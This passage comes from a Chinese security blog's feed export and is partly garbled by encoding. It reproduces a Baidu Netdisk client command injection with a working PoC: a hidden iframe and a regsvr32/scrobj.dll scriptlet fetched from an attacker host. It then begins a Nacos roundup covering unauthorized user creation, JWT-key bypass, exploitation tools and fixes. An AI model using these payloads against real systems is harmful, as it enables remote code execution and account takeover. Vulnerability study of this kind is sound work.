ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹æ¶æ„è„šæœ¬ï¼ˆå¦‚ <code>http://attacker/poc.xml</code>ï¼‰ï¼ŒXML ä¸­çš„æ¶æ„æŒ‡ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œå®ç° <strong>è¿œç¨‹å‘½ä»¤æ³¨å…¥</strong></li></ol><hr><h3 id="æ¼æ´åˆ©ç”¨é“¾"><a href="#æ¼æ´åˆ©ç”¨é“¾" class="headerlink" title="æ¼æ´åˆ©ç”¨é“¾"></a><strong>æ¼æ´åˆ©ç”¨é“¾</strong></h3><p><img src="https://img1.plumstar.cn/upload51ce4f688ad004.png"></p><hr><h3 id="PoCå…³é”®æ­¥éª¤"><a href="#PoCå…³é”®æ­¥éª¤" class="headerlink" title="PoCå…³é”®æ­¥éª¤"></a><strong>PoCå…³é”®æ­¥éª¤</strong></h3><p>æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šè¯·æ±‚å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">https:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">10000</span><span class="hljs-operator">/</span><span class="hljs-operator">?</span>method<span class="hljs-operator">=</span>OpenSafeBox&amp;uk<span class="hljs-operator">=</span>a <span class="hljs-operator">-</span>install regdll <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Windows<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>scrobj.dll<span class="hljs-char escape_">\&quot;</span> /u /i:http://attacker/poc.xml <span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>[ç”¨æˆ·å]<span class="hljs-char escape_">\\</span>AppData<span class="hljs-char escape_">\\</span>Roaming<span class="hljs-char escape_">\\</span>baidu<span class="hljs-char escape_">\\</span>BaiduNetdisk</span><br></code></pre></td></tr></table></figure><ol><li>é€šè¿‡ <code>uk</code> æ³¨å…¥ <code>-install regdll</code> å‘½ä»¤ã€‚</li><li>åˆ©ç”¨è·¯å¾„ç©¿è¶ŠæŒ‡å‘ç”¨æˆ·ç›®å½•ä¸‹çš„å¯æ§ä½ç½®ã€‚</li><li>é€šè¿‡åŒå¼•å·æˆªæ–­å°†DLLè·¯å¾„æ›¿æ¢ä¸º <code>scrobj.dll</code> å¹¶æ³¨å…¥å‚æ•° <code>/i</code>ã€‚</li><li><code>regsvr32.exe</code> åŠ è½½è¿œç¨‹XMLè„šæœ¬æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚</li></ol><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p><strong>æ³¨ï¼šçœ‹ç½‘ä¸Šè¯´pythonèµ·çš„è¿™ä¸ªhttp.serveræ˜¯å•çº¿ç¨‹å®¹æ˜“å‡ºé—®é¢˜ï¼Œå®¹æ˜“å¡ä½ï¼Œä¸è¿‡æˆ‘å¤ç°å¾ˆé¡ºåˆ©ï¼Œå¦‚æœå¡ä½äº†å°±æ¢åˆ«çš„å¼€æœåŠ¡çš„è¯•è¯•</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.36.34@2x.png" alt="CleanShot 2025-09-05 at 23.36.34@2x"></p><ul><li>poc.html</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-symbol">&lt;html&gt;</span> <span class="hljs-operator">&lt;</span>iframewidth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1px&quot;</span>height<span class="hljs-operator">=</span><span class="hljs-string">&quot;1px&quot;</span>referrerpolicy<span class="hljs-operator">=</span><span class="hljs-string">&quot;no-referrer&quot;</span>src<span class="hljs-operator">=</span>&#x27;https:<span class="hljs-operator">//</span>localhost:<span class="hljs-number">10000</span><span class="hljs-operator">/</span><span class="hljs-operator">?</span>method<span class="hljs-operator">=</span>OpenSafeBox&amp;uk<span class="hljs-operator">=</span>a <span class="hljs-operator">-</span>install regdll <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>scrobj.dll<span class="hljs-char escape_">\&quot;</span> /u /i:http://127.0.0.1:8000/poc.xml <span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\T</span>est<span class="hljs-char escape_">\A</span>ppData<span class="hljs-char escape_">\R</span>oaming<span class="hljs-char escape_">\b</span>aidu<span class="hljs-char escape_">\B</span>aiduNetdisk&#x27;&gt;&lt;/iframe&gt;&lt;/html&gt;</span><br></code></pre></td></tr></table></figure><ul><li>poc.xml</li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;poc&quot;</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">   &lt;![CDATA[    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe /c calc.exe&quot;);   ]]&gt; </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>ç„¶åå»è®¿é—®æˆ‘ä»¬å‡†å¤‡çš„ï¼Œæ³¨æ„å…¶ä¸­çš„127.0.0.1:8000ä½ å¯ä»¥ä¿®æ”¹æˆä½ çš„è¿œç¨‹vpsåœ°å€ï¼Œwinterå°±æ˜¯å½“å‰ä¸»æœºçš„ç”¨æˆ·å‘½ä»¤ï¼Œä¹Ÿè¦è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">https://127.0.0.1:10000/?method=OpenSafeBox&amp;uk=a%20-install<span class="hljs-variable">%20regdll%</span>20%22C:<span class="hljs-symbol">\\</span>\Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>scrobj.dll<span class="hljs-symbol">\%</span>22%20/u%20/i:http://127.0.0.1:8000/poc.xml%20<span class="hljs-symbol">\%</span>22<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>Users\winter\AppData\Roaming\baidu\BaiduNetdisk<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.34.47@2x.png" alt="CleanShot 2025-09-05 at 23.34.47@2x"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè°ƒç”¨regsvr32.exeå»ä¸‹è½½poc.xmlæˆåŠŸæ‰§è¡Œ</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.47.05@2x.png" alt="CleanShot 2025-09-05 at 23.47.05@2x"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://mp.weixin.qq.com/s/9ixapjlMLrnqKRB9_W-ypw">https://mp.weixin.qq.com/s/9ixapjlMLrnqKRB9_W-ypw</a></p><p><a href="https://mrxn.net/news/baidupan-windows-client-rce.html">https://mrxn.net/news/baidupan-windows-client-rce.html</a></p>]]></content>
    
    
    <categories>
      
      <category>å‘½ä»¤æ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç™¾åº¦ç½‘ç›˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacosç³»åˆ—å®‰å…¨é—®é¢˜æ•´ç†</title>
    <link href="/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"/>
    <url>/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>å†™è¿™ç¯‡æ–‡ç« çš„èµ·æºè‡ªHWæœŸé—´é‡åˆ°å¾ˆå¤šå¹¶ä¸”ä¹‹å‰å¹¶æœªäº†è§£Nacosç³»åˆ—æ¼æ´æˆ–è€…Nacosç›¸å…³ä¿¡æ¯ï¼Œæ•…å‡ºç”Ÿäº†è¿™ç¯‡æ–‡ç« </p><p>å…¶å®å…³äºNacoså®‰å…¨é—®é¢˜çš„æ ¹æœ¬åŸå› ï¼Œæ­£å¦‚å®˜æ–¹çš„å¼€å‘æ–‡æ¡£æ‰€è¯´ï¼ŒNacosæä¾›ç®€å•çš„é‰´æƒå®ç°ï¼Œå³åªæä¾›é˜²æ­¢ä¸šåŠ¡é”™ç”¨çš„å¼±é‰´æƒä½“ç³»ï¼Œè€Œä¸æ˜¯é˜²æ­¢æ¶æ„æ”»å‡»çš„å¼ºé‰´æƒä½“ç³»ï¼Œæ­£æ˜¯å¯¼è‡´è¿™äº›å®‰å…¨é—®é¢˜çš„æ ¹æœ¬åŸå› ï¼Œä¸çŸ¥é“Nacosæ˜¯å¦è€ƒè™‘åç»­æ”¹è¿›ä¸€ä¸‹ï¼Œå› ä¸ºHWæœŸé—´å› æ­¤äº§ç”Ÿçš„å®‰å…¨é—®é¢˜å·²ç»æ¯”è¾ƒå½±å“æ­£å¸¸ä¸šåŠ¡äº†</p><p>äº‹å®è¯æ˜ï¼Œä¸å®‰å…¨çš„ä¸€ç›´æ˜¯äººæ€§ï¼Œè€Œä¸æ˜¯å…¶ä»–ä¸œè¥¿</p><p><img src="https://img1.plumstar.cn/upload5image-20240910145433022.png"></p><h1 id="Nacoså¿«é€Ÿåˆ©ç”¨å·¥å…·"><a href="#Nacoså¿«é€Ÿåˆ©ç”¨å·¥å…·" class="headerlink" title="Nacoså¿«é€Ÿåˆ©ç”¨å·¥å…·"></a>Nacoså¿«é€Ÿåˆ©ç”¨å·¥å…·</h1><p>å…¶å®æœ¬æ¥æƒ³æ”¾åˆ°æœ€åé¢çš„ï¼Œä½†æ˜¯æƒ³åˆ°å·¥ä½œä¸­æ£€æŸ¥ç±»ä¼¼æ¼æ´è‚¯å®šå°‘ä¸äº†å·¥å…·ï¼Œæ‰€ä»¥æ”¾åœ¨æœ€å‰é¢æ¯”è¾ƒåˆé€‚ï¼Œè¿™é‡Œæˆ‘å°±å†™ä¿©ï¼Œå…¶å®è¿˜æ˜¯ä¸å°‘çš„</p><h2 id="HKEcho-Nacos"><a href="#HKEcho-Nacos" class="headerlink" title="HKEcho_Nacos"></a>HKEcho_Nacos</h2><p>ä½œè€…ï¼š<strong>HKEcho@æ·±è“å®éªŒå®¤å¤©ç„æ”»é˜²æˆ˜é˜Ÿ</strong></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/HKEcho5213/HKEcho_Nacos.git">https://github.com/HKEcho5213/HKEcho_Nacos.git</a></p><p>å·¥å…·æ”¯æŒæ£€æµ‹ä»¥ä¸‹æ¼æ´ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0ã€æœªæˆæƒæŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨<br><br>ä»¥ä¸‹æ¼æ´é¡ºåºæ‰§è¡Œç›´åˆ°è·å–åˆ°ä¸€ä¸ªè´¦å·ï¼š<br>1ã€æ£€æµ‹nacosé»˜è®¤å£ä»¤<br>2ã€ä»»æ„ç”¨æˆ·æ·»åŠ <br>3ã€ä»»æ„ç”¨æˆ·æ·»åŠ UA<span class="hljs-emphasis">_Bypass</span><br><span class="hljs-emphasis">4ã€ä»»æ„ç”¨æˆ·æ·»åŠ æœ«å°¾æ–œæ ç»•è¿‡</span><br><span class="hljs-emphasis">5ã€é»˜è®¤JWTä»»æ„ç”¨æˆ·æ·»åŠ </span><br><span class="hljs-emphasis">6ã€JWT_Secret_</span>Keyç¡¬ç¼–ç ç»•è¿‡<br>7ã€Identityç¡¬ç¼–ç ç»•è¿‡<br>8ã€QVD-2023-6271èº«ä»½è®¤è¯ç»•è¿‡<br>ä¸€æ—¦æŸä¸ªæ¼æ´è·å–è´¦å·å¯†ç åï¼Œä¼šè°ƒç”¨a1phaboyå¸ˆå‚…å†™çš„nacosleakè¯»å–é…ç½®æ–‡ä»¶<br><br>9ã€Nacos<span class="hljs-emphasis">_Jraft_Hessianååºåˆ—åŒ–æ¼æ´</span><br><span class="hljs-emphasis">ç¨‹åºä¼šè°ƒç”¨c0olwå¸ˆå‚…å†™çš„NacosRceæ‰“ä¸€éJraft_</span>Hessianååºåˆ—åŒ–æ¼æ´ï¼ˆæœ¬å·¥å…·åœ¨è°ƒç”¨è¿™ä¸ªNacosRceå·¥å…·å‰ä¼šåˆ¤æ–­Javaç¯å¢ƒï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™å‘Šè­¦ä¸æ‰§è¡Œ<br></code></pre></td></tr></table></figure><p><strong>å®‰è£…</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">HKEcho</span>_Nacos&gt;python <span class="hljs-title class_">HKEcho</span>_Nacos.py -h<br>* * * * * * * * * * * * * * * * * * * * * * * *<br>        ~~|<span class="hljs-params"></span>|<span class="hljs-title class_">HKEcho</span> <span class="hljs-title class_">Nacos</span>å¿«é€Ÿåˆ©ç”¨å·¥å…·|<span class="hljs-params"></span>|~~<br>                ã€*ã€‘<span class="hljs-title class_">Author</span>ï¼š<span class="hljs-title class_">HKEcho</span><br><br>&lt;*å“¥æ–¯æ‹‰å†…å­˜é©¬*&gt;<br>å¯†ç <span class="hljs-symbol">:pass/key</span><br>è®¾ç½®è¯·æ±‚å¤´<span class="hljs-symbol">:x-client-data</span><span class="hljs-symbol">:godzilla</span>;<br>è®¾ç½®<span class="hljs-title class_">Referer</span><span class="hljs-symbol">:https</span><span class="hljs-symbol">://www</span>.google.com/<br>* * * * * * * * * * * * * * * * * * * * * * * *<br><span class="hljs-symbol">usage:</span> <span class="hljs-title class_">HKEcho</span>_Nacos.py [-h] [-u <span class="hljs-variable constant_">URL</span>] [-f <span class="hljs-variable constant_">FILENAME</span>]<br><br>optional <span class="hljs-symbol">arguments:</span><br>  -h, --help   show this help message <span class="hljs-keyword">and</span> exit<br>  -u <span class="hljs-variable constant_">URL</span>       è¦æ£€æŸ¥æ¼æ´çš„å•ä¸ª<span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8848</span><br>  -f <span class="hljs-variable constant_">FILENAME</span>  æ‰¹é‡æ£€æµ‹,åŒ…å«<span class="hljs-variable constant_">URL</span>çš„æ–‡æœ¬æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><strong>1ã€å•ä¸ªç›®æ ‡æ£€æµ‹ï¼š</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> HKEcho_Nacos.py -u http://<span class="hljs-number">192</span>.<span class="hljs-number">2</span>xx.<span class="hljs-number">2</span>xx.<span class="hljs-number">1</span>x:<span class="hljs-number">8848</span><br></code></pre></td></tr></table></figure><p><strong>2ã€æ‰¹é‡ç›®æ ‡æ£€æµ‹ï¼š</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python HKEcho_Nacos<span class="hljs-selector-class">.py</span> -f target<span class="hljs-selector-class">.txt</span> <span class="hljs-comment">//æ–°å»ºtarget.txtï¼Œä¸€è¡Œæ”¾ä¸€ä¸ªNacosçš„URL</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„æˆ‘å°±ä¸åšè¿‡å¤šè®²è§£äº†ï¼Œé¡¹ç›®ä½œè€…åœ¨é¡¹ç›®çš„readmeå·²ç»è¯´çš„æ¯”è¾ƒè¯¦ç»†äº†ï¼Œå¯ä»¥ç›´æ¥åŒºGitHubçœ‹ï¼Œæ–‡ç« ä¸»è¦é‡ç‚¹æ”¾åœ¨æ¼æ´ä¸Š</p><h2 id="NacosExploitGUI"><a href="#NacosExploitGUI" class="headerlink" title="NacosExploitGUI"></a>NacosExploitGUI</h2><p><a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p><p>å¯¹äºæˆ‘è¿™ç§å·¥ä½œæœŸé—´éœ€è¦åŸºçº¿æ’æŸ¥çš„è¿˜æ˜¯å¾ˆæ–¹ä¾¿å¿«æ·çš„</p><h1 id="æƒé™ç»•è¿‡ç±»"><a href="#æƒé™ç»•è¿‡ç±»" class="headerlink" title="æƒé™ç»•è¿‡ç±»"></a>æƒé™ç»•è¿‡ç±»</h1><p>é™¤CVE-2021-29441ï¼Œéƒ½æ˜¯ç ”å‘äººå‘˜åœ¨ä»£ç ä¸­æ²¡æœ‰å°†ä»¥ä¸‹é‰´æƒåŠŸèƒ½é…ç½®æ­£ç¡®å¯¼è‡´çš„æƒé™ç»•è¿‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># å¼€å¯é‰´æƒ</span><br>nacos.core.auth.<span class="hljs-attribute">enabled</span>=<span class="hljs-literal">true</span><br>nacos.core.auth.system.<span class="hljs-attribute">type</span>=nacos<br><span class="hljs-comment"># å¼€å¯é‰´æƒä¹‹åï¼Œä½ å¯ä»¥è‡ªå®šä¹‰ç”¨äºç”ŸæˆJWTä»¤ç‰Œçš„å¯†é’¥  </span><br><span class="hljs-comment"># The default token(Base64 String)</span><br><span class="hljs-comment"># è‡ªå®šä¹‰å¯†é’¥æ—¶ï¼Œæ¨èå°†é…ç½®é¡¹è®¾ç½®ä¸ºBase64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œä¸”åŸå§‹å¯†é’¥é•¿åº¦ä¸å¾—ä½äº32å­—ç¬¦ã€‚  </span><br>nacos.core.auth.default.token.secret.key=<br><span class="hljs-comment"># å…³é—­ä½¿ç”¨user-agentåˆ¤æ–­æœåŠ¡ç«¯è¯·æ±‚å¹¶æ”¾è¡Œé‰´æƒçš„åŠŸèƒ½</span><br>nacos.core.auth.enable.<span class="hljs-attribute">userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br><span class="hljs-comment"># å½“ä»¥ä¸Šä¸¤ä¸ªå±æ€§è¿™æ ·å¦‚æ­¤è®¾ç½®æ—¶ï¼Œä»¥ä¸‹ä¸¤ä¸ªå±æ€§ç”Ÿæ•ˆ</span><br><span class="hljs-comment"># é…ç½®è‡ªå®šä¹‰èº«ä»½è¯†åˆ«çš„keyï¼ˆä¸å¯ä¸ºç©ºï¼‰å’Œvalueï¼ˆä¸å¯ä¸ºç©ºï¼‰</span><br><span class="hljs-comment"># è¿™ä¸¤ä¸ªå±æ€§æ˜¯æˆæƒç™½åå•ï¼Œç”¨äºæ ‡è¯†æ¥è‡ªå…¶ä»–æœåŠ¡å™¨çš„è¯·æ±‚ã€‚</span><br>nacos.core.auth.server.identity.<span class="hljs-attribute">key</span>=nacosKey<br>nacos.core.auth.server.identity.<span class="hljs-attribute">value</span>=nacosValue<br></code></pre></td></tr></table></figure><h2 id="é»˜è®¤é…ç½®æœªæˆæƒè®¿é—®æ¼æ´"><a href="#é»˜è®¤é…ç½®æœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="é»˜è®¤é…ç½®æœªæˆæƒè®¿é—®æ¼æ´"></a>é»˜è®¤é…ç½®æœªæˆæƒè®¿é—®æ¼æ´</h2><blockquote><p>æˆå› ï¼šnacos.core.auth.enabled &#x3D; false</p></blockquote><p>æ­¤æ¼æ´ä¸éœ€è¦æ·»åŠ ä»»ä½•èº«ä»½æ ‡è¯†æ¥ç»•è¿‡æ ¡éªŒï¼Œä»…ä»…æ˜¯å› ä¸ºé»˜è®¤é…ç½®æœªå¼€å¯é‰´æƒå¯¼è‡´æ¼æ´å‡ºç°</p><p><em><strong>1.1 ç¯å¢ƒæ­å»º</strong></em></p><p>Nacos gtihubä¸‹è½½åœ°å€</p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10ç¯å¢ƒæ­å»º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#è¿›å…¥nacos/binä¸‹æ‰§è¡Œ</span><br>startup.cmd -m standalone<br><span class="hljs-comment">#æ­å»ºæˆåŠŸåè®¿é—®å¯çœ‹åˆ°nacosç™»é™†ç•Œé¢</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910153248121.png"></p><p><em><strong>1.2 æ¼æ´éªŒè¯</strong></em></p><p>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ï¼Œä¸¤ä¸ªurl</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span>&amp;search=accurate&amp;accessToken<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910153557594.png"></p><p>æ–°å»ºç”¨æˆ·</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/nacos/v1/auth/users?username=test1&amp;password=test</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240910155914156.png"></p><p>æˆåŠŸç™»é™†</p><p><img src="https://img1.plumstar.cn/upload5image-20240910160119664.png"></p><p><em><strong>1.3 æ¼æ´åŸç†</strong></em></p><p>é»˜è®¤æœªå¼€å¯é…ç½® nacos.core.auth.enabled</p><p><img src="https://img1.plumstar.cn/upload5image-20240910161257773.png"></p><p>åœ¨auth&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;auth&#x2F;common&#x2F;AuthConfigs.javaç±»ä¸­ï¼ŒisAuthEnabledæ–¹æ³•çš„è¿”å›å€¼å–å†³äºnacos.core.auth.enabled ï¼ˆé»˜è®¤Falseï¼‰</p><p><img src="https://img1.plumstar.cn/upload5image-20240910162711181.png"></p><p>åœ¨core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.javaç±»ä¸­ï¼Œæ ¹æ®authConifgs.isAuthEnabled()çš„è¿”å›å€¼é»˜è®¤ä¸ºflaseï¼Œæ‰€ä»¥è¿™é‡Œé»˜è®¤è·³è¿‡æ£€æŸ¥è®¤è¯filterï¼Œç›´æ¥è¿›å…¥filterchainçš„ä¸‹ä¸€ä¸ªfilter</p><p><img src="https://img1.plumstar.cn/upload5image-20240910163105818.png"></p><p><em><strong>1.4 ä¿®å¤æ–¹æ¡ˆ</strong></em></p><p>é…ç½®æ–‡ä»¶ä¿®æ”¹ä¸ºï¼šnacos.core.auth.enabled&#x3D;True</p><p>ä¿®æ”¹ä¹‹åï¼Œå†æ¬¡å°è¯•è®¿é—®<a href="http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=1%EF%BC%8C%E5%9B%9E%E6%98%BEWhitelabelErrorPage">http://localhost:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1ï¼Œå›æ˜¾WhitelabelErrorPage</a></p><p><img src="https://img1.plumstar.cn/upload5image-20240910164309168.png"></p><h2 id="é»˜è®¤jwtå¯†é’¥æœªæˆæƒè®¿é—®"><a href="#é»˜è®¤jwtå¯†é’¥æœªæˆæƒè®¿é—®" class="headerlink" title="é»˜è®¤jwtå¯†é’¥æœªæˆæƒè®¿é—®"></a>é»˜è®¤jwtå¯†é’¥æœªæˆæƒè®¿é—®</h2><p><em><strong>2.1 æ¼æ´ç®€ä»‹</strong></em></p><p>å¼€å¯äº†nacos.core.auth.enabled çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæœªä¿®æ”¹é»˜è®¤nacos.core.auth.default.token.secret.keyï¼Œåˆ™å¯ä»¥ç”Ÿäº§accessTokenå€¼æ¥ç»•è¿‡æƒé™ã€‚</p><p>è¯¥keyå€¼å›ºå®šï¼Œåœ¨nacosä½¿ç”¨jwtæ„é€ è®¤è¯tokenï¼Œä½¿ç”¨HS256ç®—æ³•ï¼ŒæŠŠé…ç½®æ–‡ä»¶ä¸­nacos.core.auth.plugin.nacos.token.secret.keyçš„é»˜è®¤å€¼å½“ä½œç§é’¥ç”ŸæˆSignatureï¼Œå°†ç”¨æˆ·åå’Œæ—¶é—´æˆ³å†™åˆ°jwt tokené‡Œï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç™»å½•æ—¶å¯¹accessTokenè¿›è¡Œä¼ªé€ ï¼Œä»è€Œå®ç°è®¿é—®è®¤è¯ç»•è¿‡</p><p>å½±å“ç‰ˆæœ¬ï¼š<strong>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0</strong></p><p>é…ç½®æ–‡ä»¶</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span 